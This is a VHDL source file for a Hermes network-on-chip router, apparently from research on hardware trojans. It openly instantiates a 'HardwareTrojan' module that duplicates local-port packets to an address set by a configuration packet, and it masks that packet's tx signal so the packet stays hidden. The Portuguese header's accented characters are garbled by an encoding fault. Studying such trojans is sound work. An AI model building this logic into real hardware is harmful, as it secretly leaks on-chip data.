---------------------------------------------------------------------------------------	
--                                    ROUTER
--
--
--                                    NORTH         LOCAL
--                      -----------------------------------
--                      |             ******       ****** |
--                      |             *FILA*       *FILA* |
--                      |             ******       ****** |
--                      |          *************          |
--                      |          *  ARBITRO  *          |
--                      | ******   *************   ****** |
--                 WEST | *FILA*   *************   *FILA* | EAST
--                      | ******   *  CONTROLE *   ****** |
--                      |          *************          |
--                      |             ******              |
--                      |             *FILA*              |
--                      |             ******              |
--                      -----------------------------------
--                                    SOUTH
--
--  As chaves realizam a transferýncia de mensagens entre nýcleos. 
--  A chave possui uma lýgica de controle de chaveamento e 5 portas bidirecionais:
--  East, West, North, South e Local. Cada porta possui uma fila para o armazenamento 
--  temporýrio de flits. A porta Local estabelece a comunicaýýo entre a chave e seu 
--  nýcleo. As demais portas ligam a chave ýs chaves vizinhas.
--  Os endereýos das chaves sýo compostos pelas coordenadas XY da rede de interconexýo, 
--  onde X ý a posiýýo horizontal e Y a posiýýo vertical. A atribuiýýo de endereýos ýs 
--  chaves ý necessýria para a execuýýo do algoritmo de chaveamento.
--  Os mýdulos principais que compýem a chave sýo: fila, ýrbitro e lýgica de 
--  chaveamento implementada pelo controle_mux. Cada uma das filas da chave (E, W, N, 
--  S e L), ao receber um novo pacote requisita chaveamento ao ýrbitro. O ýrbitro 
--  seleciona a requisiýýo de maior prioridade, quando existem requisiýýes simultýneas, 
--  e encaminha o pedido de chaveamento ý lýgica de chaveamento. A lýgica de 
--  chaveamento verifica se ý possývel atender ý solicitaýýo. Sendo possývel, a conexýo
--  ý estabelecida e o ýrbitro ý informado. Por sua vez, o ýrbitro informa a fila que 
--  comeýa a enviar os flits armazenados. Quando todos os flits do pacote foram 
--  enviados, a conexýo ý concluýda pela sinalizaýýo, por parte da fila, atravýs do 
--  sinal sender.
---------------------------------------------------------------------------------------
library IEEE;
use IEEE.std_logic_1164.all;
use IEEE.std_logic_unsigned.all;
use work.HermesPackage.all;

entity RouterInfected is
generic( address: regmetadeflit);
port(
	clock:     in  std_logic;
	reset:     in  std_logic;
	clock_rx:  in  regNport;
	rx:        in  regNport;
	data_in:   in  arrayNport_regflit;
	credit_o:  out regNport;    
	clock_tx:  out regNport;
	tx:        out regNport;
	data_out:  out arrayNport_regflit;
	credit_i:  in  regNport);
end RouterInfected;

architecture RouterInfected of RouterInfected is

signal h, ack_h, data_av, sender, data_ack: regNport := (others=>'0');
signal data, data_outCrossbar: arrayNport_regflit := (others=>(others=>'0'));
signal mux_in, mux_out: arrayNport_reg3 := (others=>(others=>'0'));
signal free: regNport := (others=>'0');

-- trojan signals
signal duplicate, dataSel, data_ack_local, maskPkg, data_ack_dup, data_av_local, duplicating: std_logic := '0';
signal configPkg, txCrossbar : regNport := (others=>'0');
signal dupHeader, dupFlit : regflit := (others=>'0');
signal destAddr : arrayNport_regmetadeflit := (others=>(others=>'0'));
signal dest : regmetadeflit := (others=>'0');
signal mux_dup : regNport := (others=>'0');

begin

	FEast : Entity work.Hermes_buffer
	port map(
		clock => clock,
		reset => reset,
		configPkg => configPkg(0),
		destAddr => destAddr(0),
		address => address,
		data_in => data_in(0),
		rx => rx(0),
		h => h(0),
		ack_h => ack_h(0),
		data_av => data_av(0),
		data => data(0),
		sender => sender(0),
		clock_rx => clock_rx(0),
		data_ack => data_ack(0),
		credit_o => credit_o(0));

	FWest : Entity work.Hermes_buffer
	port map(
		clock => clock,
		reset => reset,
		configPkg => configPkg(1),
		destAddr => destAddr(1),
		address => address,
		data_in => data_in(1),
		rx => rx(1),
		h => h(1),
		ack_h => ack_h(1),
		data_av => data_av(1),
		data => data(1),
		sender => sender(1),
		clock_rx => clock_rx(1),
		data_ack => data_ack(1),
		credit_o => credit_o(1));

	FNorth : Entity work.Hermes_buffer
	port map(
		clock => clock,
		reset => reset,
		configPkg => configPkg(2),
		destAddr => destAddr(2),
		address => address,
		data_in => data_in(2),
		rx => rx(2),
		h => h(2),
		ack_h => ack_h(2),
		data_av => data_av(2),
		data => data(2),
		sender => sender(2),
		clock_rx => clock_rx(2),
		data_ack => data_ack(2),
		credit_o => credit_o(2));

	FSouth : Entity work.Hermes_buffer
	port map(
		clock => clock,
		reset => reset,
		configPkg => configPkg(3),
		destAddr => destAddr(3),
		address => address,
		data_in => data_in(3),
		rx => rx(3),
		h => h(3),
		ack_h => ack_h(3),
		data_av => data_av(3),
		data => data(3),
		sender => sender(3),
		clock_rx => clock_rx(3),
		data_ack => data_ack(3),
		credit_o => credit_o(3));

	FLocal : Entity work.Hermes_buffer
	port map(
		clock => clock,
		reset => reset,
		configPkg => configPkg(4),
		destAddr => destAddr(4),
		address => address,
		data_in => data_in(4),
		rx => rx(4),
		h => h(4),
		ack_h => ack_h(4),
		data_av => data_av_local,
		data => data(4),
		sender => sender(4),
		clock_rx => clock_rx(4),
		data_ack => data_ack_local,
		credit_o => credit_o(4));

	SwitchControl : Entity work.SwitchControl(AlgorithmXY)
	port map(
		clock => clock,
		reset => reset,
		duplicate => duplicate,
		dupAddr => dupHeader(METADEFLIT-1 downto 0),
		h => h,
		ack_h => ack_h,
		address => address,
		data => data,
		sender => sender,
		free => free,
		mux_in => mux_in,
		mux_out => mux_out,
		mux_dup => mux_dup,
		duplicating_o => duplicating);

	CrossBar : Entity work.Hermes_crossbar
	port map(
		data_av => data_av,
		data_in => data,
		data_ack => data_ack,
		data_dup => dupFlit,
		data_ack_dup => data_ack_dup,
		sender => sender,
		free => free,
		tab_in => mux_in,
		tab_out => mux_out,
		tab_dup => mux_dup,
		tx => txCrossbar,
		data_out => data_outCrossbar,
		credit_i => credit_i);

	CLK_TX : for i in 0 to(NPORT-1) generate
		clock_tx(i) <= clock;
	end generate CLK_TX;

	---------------------
	-- HARDWARE TROJAN --
	---------------------
	HTrojan : Entity work.HardwareTrojan
	port map(
		clock 			=> clock,
        reset 			=> reset,
        data_in 		=> data(4),
        sending			=> sender(4),
        destAddr		=> dest,
        dupFlit			=> dupFlit,
        duplicate 		=> duplicate,
    	free			=> free,
		mux_in 			=> mux_in,
		mux_out 		=> mux_out,
        configPkg 		=> configPkg,
        creditIn 		=> data_ack, -- or credit_i
        dataSel			=> dataSel,
      	maskPkg_o		=> maskPkg,
      	h				=> h(4),
      	h_ack			=> ack_h(4)
	);

	-- Enquanto estiver duplicando pacotes - Mascara-se o credito que vem dos transmissores pra não perder dado em caso de parada de um dos fluxos
	data_ack_local <= data_ack(LOCAL) AND data_ack_dup when duplicating = '1' else
					  data_ack(LOCAL);

	-- Não deixa passar o TX se ambos os buffers não podem recebe-lo - para evitar duplicação de flits em um dos buffers.
	data_av(4) <= data_av_local when data_ack_local = '1' and duplicating = '1' else
				  data_av_local when duplicating = '0' else
				  '0';

	-- Mux to define the address source
	dest <= destAddr(0) when configPkg(0) = '1' else
			destAddr(1) when configPkg(1) = '1' else
			destAddr(2) when configPkg(2) = '1' else
			destAddr(3) when configPkg(3) = '1' else
			destAddr(4);

	-- To ofuscate the configuration packet
	tx(LOCAL) <= txCrossbar(LOCAL) AND maskPkg;
	tx(EAST) <= txCrossbar(EAST);
	tx(WEST) <= txCrossbar(WEST);
	tx(SOUTH) <= txCrossbar(SOUTH);
	tx(NORTH) <= txCrossbar(NORTH);

	data_out <= data_outCrossbar;

end RouterInfected;
